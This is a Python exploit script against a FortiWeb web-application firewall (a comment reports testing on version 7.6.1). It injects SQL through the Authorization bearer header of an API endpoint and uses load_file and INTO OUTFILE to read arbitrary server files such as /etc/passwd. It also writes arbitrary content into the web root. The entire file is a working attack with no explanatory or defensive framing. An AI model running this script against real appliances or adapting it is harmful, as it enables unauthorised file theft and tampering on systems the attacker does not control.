#!/usr/bin/env python3
import binascii
import logging
import random
import string
import typing
from os.path import abspath
from urllib.parse import urljoin

import requests
import urllib3
from pydantic import validate_call

urllib3.disable_warnings()


class BUG_001:
    def __init__(self, target: str):
        self._target = target
        self._buggy_api = '/api/fabric/device/status'
        self._logger = logging.getLogger(__class__.__name__)
        self._logger.setLevel(logging.INFO)

        handler = logging.StreamHandler()
        formatter = logging.Formatter(
            f'%(levelname)s:%(asctime)s:{__class__.__name__}->%(funcName)s: %(message)s', datefmt='%H:%M:%S')
        handler.setFormatter(formatter)
        self._logger.addHandler(handler)
        return

    @validate_call(validate_return=True)
    def write_file(self, target_path: str, content: bytes) -> bool:
        rc = False
        headers = {
            "Authorization": f"Bearer 'and('x'='x')union(select(0x{binascii.hexlify(content).decode()}))/**/into/**/outfile/**/'{target_path}';--+-"
        }
        dst_url = urljoin(self._target, self._buggy_api)
        try:
            r = requests.get(dst_url, headers=headers, verify=False)
            rc = r.status_code == 401
        except Exception as e:
            rc = False
            self._logger.error('Sending Request Failed: '+e)

        return rc

    @validate_call(validate_return=True)
    def read_file(self, target_path: str) -> typing.Optional[bytes]:
        result = None
        tmpfile = self._tmpfile()
        outfile = f'/migadmin/angular/{tmpfile}.txt'
        headers = {
            "Authorization": f"Bearer 'and('x'='x')union(select(load_file('{target_path}')))/**/into/**/outfile/**/'{outfile}';--+-"
        }
        self._logger.debug(headers)
        dst_url = urljoin(self._target, self._buggy_api)
        self._logger.debug(dst_url)
        try:
            r = requests.get(dst_url, headers=headers, verify=False)
        except requests.exceptions.ConnectionError as e:
            return None
        check_url = urljoin(self._target, f'{tmpfile}.txt')
        con = self._file_exists(check_url)
        if r.status_code == 401 and con:
            self._logger.info(f'File was copied to {check_url}')
            result = con
        else:
            self._logger.error('File failed to copy')
            result = None

        return result

    @validate_call(validate_return=True)
    def _tmpfile(self, size=6, chars=string.ascii_lowercase + string.digits) -> str:
        return ''.join(random.choice(chars) for _ in range(size))

    @validate_call(validate_return=True)
    def _file_exists(self, path) -> typing.Optional[bytes]:
        result = None
        dst_url = urljoin(self._target, path)
        self._logger.debug(f'Checking whether {dst_url} exists..')
        r = requests.get(dst_url, verify=False)
        if r.status_code == 200:
            result = r.content
        else:
            result = None
        return result


def main():
    # Tested on: FortiWeb-VM 7.6.1,build1010(GA.F),241126
    host = 'https://192.168.10.144'
    rw_primitive = BUG_001(host)
    lol = rw_primitive.read_file('/etc/passwd')
    rw_primitive._logger.info(b'got it!! '+lol)

    works = rw_primitive.write_file(
        '/migadmin/angular/lmaooo.txt', b'hacked!!!')
    if works:
        rw_primitive._logger.info('file wrote!!!!')


if __name__ == '__main__':
    main()
